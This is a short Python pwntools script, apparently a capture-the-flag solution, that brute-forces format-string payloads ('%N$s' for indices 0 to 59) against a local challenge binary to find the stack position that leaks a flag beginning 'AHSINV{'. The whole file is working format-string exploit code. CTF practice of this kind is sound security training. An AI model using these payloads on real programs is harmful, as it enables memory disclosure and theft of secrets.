import sys
from pwn import *

stackIndex = None

context.binary = binary = ELF("./DisassembleTheStack")

for x in range(0, 60):
    format_s = b"".join([b"%" + str(x).encode("utf-8") + b"$s"])
    p = process()
    p.recvuntil(b"first: ")
    p.sendline(format_s)
    output = p.recvall().decode("latin-1")
    print(x)
    if "AHSINV{" in output:
        stackIndex = x

print(f"The flag is on this stack index: {stackIndex}")
